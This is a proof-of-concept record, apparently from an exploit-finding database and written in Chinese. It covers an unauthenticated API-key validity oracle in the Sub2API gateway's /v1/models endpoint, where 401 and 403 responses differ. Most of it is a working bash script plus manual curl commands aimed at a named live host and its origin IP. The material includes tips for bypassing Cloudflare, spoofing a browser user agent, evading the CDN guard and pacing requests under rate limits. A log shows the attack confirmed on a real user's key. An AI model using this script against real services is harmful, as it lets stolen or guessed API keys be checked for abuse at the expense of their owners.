# Sub2API /v1/models 未授权 API Key 有效性与余额状态 oracle（401 INVALID_API_KEY vs 403 INSUFFICIENT_BALANCE）

- **code**: sub2api-v1-models-apikey-validity-balance-oracle
- **kind**: script
- **category**: info-leak
- **component**: Sub2API (Wei-Shaw/sub2api) /v1/models api key 鉴权中间件
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: task#629 / finding 1299，2026-11-08 01:27–01:29 (UTC+8)，Windows 执行机 curl.exe --noproxy "*" --resolve dahurj999.top:443:23.147.164.112 直连源站，三条对照成立：① 伪造 key（sk- 后 64 个 0）→ HTTP 401 / 54B {"code":"INVALID_API_KEY","message":"Invalid API key"}；② user1013 名下真实有效 key（账户 balance=0）→ HTTP 403 / 72B {"code":"INSUFFICIENT_BALANCE","message":"Insufficient account balance"}；③ 用 user1013 的 JWT 调 DELETE /api/v1/keys/1395 删除该 key 后，同一字符串再打 /v1/models 由 403 回落 401 INVALID_API_KEY —— 证明 403 分支只在 key 真实存在且有效时出现，401/403 分叉即 oracle。
- **path**: pocs/sub2api-v1-models-apikey-validity-balance-oracle/sub2api_apikey_validity_oracle.sh
- **tags**: sub2api,api-key,oracle,credential-validation,balance,unauth,v1/models,401,403,零消费
- **created_at**: 2026-11-07T17:37:51.186Z
- **engine**: https://dahurj999.top（源站 23.147.164.112:443）
- **found_by**: exploit

## 描述

Sub2API 网关的 /v1/models 在 API key 校验阶段就把"key 不存在/伪造"（401 INVALID_API_KEY）与"key 真实有效但账户余额为 0"（403 INSUFFICIENT_BALANCE）分成两个稳定不同的响应，因此无需任何账号、Cookie 或管理凭据，仅凭候选 sk- 字符串发一次只读 GET 即可判定该 key 是否真实存在、归属该网关、以及账户是否欠费。属于零消费的凭据验活 oracle。

## 用法

```
前置：目标为 Sub2API 系（GET /api/v1/settings/public 返回 {"code":0,"message":"success"}、前端 bundle 含 sub2api）；Cloudflare 前置时用 --resolve 直连源站并 --noproxy "*"；必须带浏览器 UA，不要带 X-Forwarded-For（CDN _guard 会 456）。

  bash sub2api_apikey_validity_oracle.sh <host> <origin_ip> <candidate_key> [more_keys...]
  # 例：bash sub2api_apikey_validity_oracle.sh dahurj999.top 23.147.164.112 sk-xxxx

判读表：
  401 {"code":"INVALID_API_KEY"}        → key 不存在/伪造/已删除（阴性基线，先用一份自造 key 打一次确认）
  403 {"code":"INSUFFICIENT_BALANCE"}   → key 真实有效、归属该网关，但账户余额为 0（不可直接调用付费接口）
  200 模型列表 JSON                      → key 有效且可用
  429 + Retry-After: 60                 → 命中 invalid_auth 限流桶（120 次/60s 共享 /v1beta、/images），立即停手等冷却
  403/503 HTML 或 Cloudflare 挑战        → 未命中源站（代理污染/SNI 或 IP 不对），改用 --noproxy "*" --resolve 重试

限速：每 key 只打 1 次，串行 ≥1s，绝不批量遍历（401 桶打满会连累同出口的正常业务请求）。

自证 oracle（有该 key 归属用户 JWT 时）：DELETE /api/v1/keys/<key_id> 后再打 /v1/models，403 应回落为 401，即证明 403 分支依赖 key 实体存在。
```

## 正文

```
# Sub2API /v1/models API Key 有效性与余额状态 oracle
#
# 原理：Sub2API 在 API key 鉴权阶段分两步回错误 ——
#   1) key 查不到 → 401 {"code":"INVALID_API_KEY"}
#   2) key 查到且有效，但所属用户/分组余额不足 → 403 {"code":"INSUFFICIENT_BALANCE"}
# 两个响应在状态码 + body 上稳定分叉，且 /v1/models 是只读、零消费接口。
# 因此无需任何账号即可把任意候选 sk- 字符串判定为「伪造 / 真实但欠费 / 可用」三种之一。
#
# 用法：
#   bash sub2api_apikey_validity_oracle.sh <host> <origin_ip> <key> [key2 ...]
#   bash sub2api_apikey_validity_oracle.sh dahurj999.top 23.147.164.112 sk-aaaaaaaa...
#
# 注意：
#   · 本机若有 HTTP 代理，必须 --noproxy "*"，否则 SNI 落到代理/CDN，结论不可信；
#   · Cloudflare 前置时 --resolve 到源站 IP 直连，并带浏览器 UA；
#   · 不要带 X-Forwarded-For（部分 Sub2API 前置 CDN 会直接 456）；
#   · 每 key 只打一次，串行 >=1s。401 桶 120 次/60s 打满后同出口全部 429。

HOST="$1"; IP="$2"; shift 2
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

probe() {
  local key="$1"
  local out code body
  out=$(curl.exe -sS -k --noproxy '*' --max-time 20 \
        --resolve "${HOST}:443:${IP}" \
        -A "$UA" -H "Accept: application/json" \
        -H "Authorization: Bearer ${key}" \
        -w '\n__HTTP__%{http_code}' \
        "https://${HOST}/v1/models" 2>&1)
  code=$(printf '%s' "$out" | sed -n 's/.*__HTTP__//p' | tail -1)
  body=$(printf '%s' "$out" | sed 's/__HTTP__[0-9]*$//' | tr -d '\r')

  case "$code $body" in
    "401 "*) if printf '%s' "$body" | grep -q 'INVALID_API_KEY'; then
               echo "[401 INVALID_API_KEY]   伪造/不存在/已删除  key=${key:0:12}..."
             else
               echo "[401 其他] ${body:0:120}  key=${key:0:12}..."
             fi ;;
    "403 "*) if printf '%s' "$body" | grep -q 'INSUFFICIENT_BALANCE'; then
               echo "[403 INSUFFICIENT_BALANCE] 真实有效但余额为 0  key=${key:0:12}..."
             else
               echo "[403 其他] ${body:0:120}  key=${key:0:12}..."
             fi ;;
    "200 "*) echo "[200 OK] key 有效且可用  key=${key:0:12}..." ;;
    "429 "*) echo "[429 限流] 立刻停手，等 Retry-After 后再试  key=${key:0:12}..." ;;
    *)       echo "[$code] ${body:0:160}  key=${key:0:12}..." ;;
  esac
}

# 0) 阴性对照：自造一个必不存在的 key，确认端点与网络路径正确
echo "== 阴性对照（伪造 key）=="
probe "sk-0000000000000000000000000000000000000000000000000000000000000000"
sleep 1

# 1) 逐个候选
for k in "$@"; do
  echo "== 候选 =="
  probe "$k"
  sleep 1
done

# ---------------------------------------------------------------------------
# 手工等价命令（不依赖脚本）
# ---------------------------------------------------------------------------
# 阴性对照：
#   curl.exe -sS -k --noproxy "*" --resolve dahurj999.top:443:23.147.164.112 \
#     -A "Mozilla/5.0 ... Chrome/131" \
#     -H "Authorization: Bearer sk-000...000" \
#     https://dahurj999.top/v1/models
#   -> HTTP 401  {"code":"INVALID_API_KEY","message":"Invalid API key"}
#
# 待判 key：
#   curl.exe -sS -k --noproxy "*" --resolve dahurj999.top:443:23.147.164.112 \
#     -A "Mozilla/5.0 ... Chrome/131" \
#     -H "Authorization: Bearer <REDACTED_API_KEY>" \
#     https://dahurj999.top/v1/models
#   -> HTTP 403  {"code":"INSUFFICIENT_BALANCE","message":"Insufficient account balance"}
#
# 因果自证（仅在持有该 key 归属用户 JWT 时做，一次即可）：
#   DELETE /api/v1/keys/<KEY_ID>   Authorization: Bearer <REDACTED_JWT>
#   -> 200 {"code":0,"message":"success","data":{"message":"API key deleted successfully"}}
#   删除后再用原 key 打 /v1/models -> 401 INVALID_API_KEY（不再是 403），
#   说明 403 只在 key 实体真实存在时出现。
#
# ---------------------------------------------------------------------------
# 判据与失败原因
# ---------------------------------------------------------------------------
# 成立条件：401/403 两个响应在多次单发下稳定复现，且删除 key 后 403→401 可逆。
# 常见失败：
#   · 直接打域名没带 --resolve：落到 Cloudflare，返回 403 HTML / challenge，不是源站语义；
#   · 本机代理未关：--noproxy "*" 缺失导致 DNS/SNI 走代理；
#   · 缺浏览器 UA 或带 X-Forwarded-For：被前置 _guard 拦成 456；
#   · 连续打同一 key：invalid_auth 桶 120/60s 耗尽后全部 429 + Retry-After: 60；
#   · 目标不是 Sub2API（New API/one-api 文案是 Invalid token / User has been banned），
#     本条判读表不适用，需按 new-api 那条 oracle 处理。

```
